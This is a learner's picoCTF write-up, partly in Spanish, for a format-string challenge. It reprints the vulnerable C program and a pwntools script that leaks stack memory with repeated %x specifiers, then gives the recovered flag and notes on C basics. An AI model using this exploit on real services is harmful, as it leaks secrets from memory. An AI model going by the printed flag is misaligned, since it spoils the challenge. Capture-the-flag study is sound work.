# Description #

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

# Hints #

Okay, maybe I'd believe you if you find my API key.

# Process#

This is the portion of the code that has the flag

```
int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

```
This is what the code does ( sorry it's in spanish xD)

La función `buy_stonks(Portfolio *p)` en tu código realiza las siguientes operaciones:

1. Comprueba si el puntero al portafolio `p` es NULL. Si es así, devuelve 1 y termina la función.
    
2. Abre un archivo llamado “api” para lectura y almacena el puntero al archivo en `f`. Si el archivo no se puede abrir (es decir, `f` es NULL), imprime un mensaje de error y termina el programa.
    
3. Lee una línea del archivo “api” en `api_buf`.
    
4. Inicializa `money` con la cantidad de dinero en el portafolio, y `shares` y `temp` a 0 y NULL respectivamente.
    
5. Entra en un bucle mientras haya dinero en el portafolio. En cada iteración del bucle:
    
    - Elige un número aleatorio de acciones para comprar (entre 1 y la cantidad de dinero restante).
    - Crea una nueva “stonk” con ese número de acciones usando la función `pick_symbol_with_AI(shares)`.
    - Añade la nueva “stonk” al principio de la lista de “stonks” en el portafolio.
    - Resta el número de acciones compradas a la cantidad de dinero restante.
6. Pide al usuario que introduzca su token de API, lo almacena en `user_buf`, e imprime el token.
    
7. Llama a la función `view_portfolio(p)` para mostrar el portafolio.
    
8. Devuelve 0 para indicar que la función se ha ejecutado correctamente.
    

Por lo tanto, esta función simula la compra de “stonks” con un algoritmo AI, actualiza el portafolio con las nuevas “stonks”, e interactúa con una supuesta API utilizando un token proporcionado por el usuario. Sin embargo, actualmente no realiza ninguna operación real con la API (como se indica en los comentarios TODO).



Trying to understand this, I was able to know that here we have a vulnerability called "format string attack" or "format string vulnerability"

https://owasp.org/www-community/attacks/Format_string_attack

I tried to retrieve the information putting %x %x %x %x multiple times when the app asked me for a token. So, the only way that I have to do it was with a code, with pwntools that I found, I didnt write it but I can understand what it does.

I recommend to print step by step the code , so you can understand what it does .

```
# import pwntools
from pwn import *
# string to write to
s = "" 

# open up remote connection
r = remote('mercury.picoctf.net', 53437) 
# get to vulnerability 
r.recvuntil("View my") 
r.send("1\n") 
r.recvuntil("What is your API token?\n") 

# send string to print stack 
r.send("%x" + "-%x"*40 + "\n") 

# receive until the line we want 
r.recvline()

# read in line 
x = r.recvline() 

# remove unwanted components 
x = x[:-1].decode() 

# parse to characters 

 for i in x.split('-'): 
   if len(i) == 8:
    a = bytearray.fromhex(i)
   
	for b in reversed(a):
	    if b > 32 and b < 128:
	      s += chr(b) 
	      
# print string
print(s)
```

The program print this
```
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}@+9ykk
```
and the flag was this

```
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
```






# Assets #

Vuln.c code

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}
    
```

# NOtes #

%d = prints "int" numbers
%s = prints char
%x = prints hex values

`#define` Define una constante 



#### struct
`typedef struct`: 
[Una estructura en C es una colección de variables de diferentes tipos que se agrupan bajo un mismo nombre para facilitar su manejo](https://es.wikibooks.org/wiki/Programaci%C3%B3n_en_C/Estructuras_y_Uniones)[1](https://es.wikibooks.org/wiki/Programaci%C3%B3n_en_C/Estructuras_y_Uniones). Es similar a un objeto en Python o JavaScript, pero no es exactamente lo mismo. A diferencia de las clases en PHP, las estructuras en C no tienen métodos (funciones), solo contienen datos.

` struct Stonks *next; ` : this is a "pointer" to another data


```c
typedef struct Stonks { ... } Stonk;
`
Está definiendo una estructura llamada `Stonks` y al mismo tiempo está creando un alias llamado `Stonk` para esa estructura. Esto te permite declarar variables de este tipo usando simplemente `Stonk myVariable;`.
```

#### funcion
`int view_portfolio(Portfolio *p) {}` Es una funcion, pero se estructura asi porque devuelve un entero



#### fflush
`fflush` :
[Por otro lado, `fflush` es una función en C que se utiliza para limpiar (o “vaciar”) el búfer de un flujo de salida](http://www.carlospes.com/curso_de_lenguaje_c/01_11_la_funcion_fflush.php)[1](http://www.carlospes.com/curso_de_lenguaje_c/01_11_la_funcion_fflush.php)[2](https://ciksiti.com/es/chapters/10074-how-to-use-fflush-function-in-c-programming)[3](https://www.programacionwebs.com/c/funcion-fflush-en-c/). En tu código, se utiliza para asegurar que cualquier dato aún no escrito en el flujo de salida estándar (`stdout`) se escriba antes de llamar a la función `system`. [Esto es útil para evitar cualquier comportamiento inesperado debido a la mezcla de flujos de salida estándar y flujos de comandos del sistema](http://www.carlospes.com/curso_de_lenguaje_c/01_11_la_funcion_fflush.php)[1](http://www.carlospes.com/curso_de_lenguaje_c/01_11_la_funcion_fflush.php).

#### malloc
`malloc` :
`malloc` es una función en el lenguaje de programación C que se utiliza para asignar memoria dinámicamente. En otras palabras, `malloc` te permite solicitar un bloque específico de memoria durante la ejecución de tu programa.

La línea `Stonk *stonk = malloc(sizeof(Stonk));` está haciendo lo siguiente:

1. `sizeof(Stonk)`: Esta parte calcula el tamaño necesario para almacenar una estructura `Stonk`. `sizeof` es un operador en C que devuelve el tamaño en bytes del tipo o objeto que le pases.
    
2. `malloc(sizeof(Stonk))`: Luego, `malloc` solicita esa cantidad de memoria del sistema. Si la solicitud es exitosa, `malloc` devuelve un puntero a la memoria asignada.
    
3. `Stonk *stonk = ...`: Finalmente, este puntero se guarda en la variable `stonk`. Ahora puedes usar `stonk` para acceder y manipular esta memoria asignada, que tiene suficiente espacio para almacenar una estructura `Stonk`.







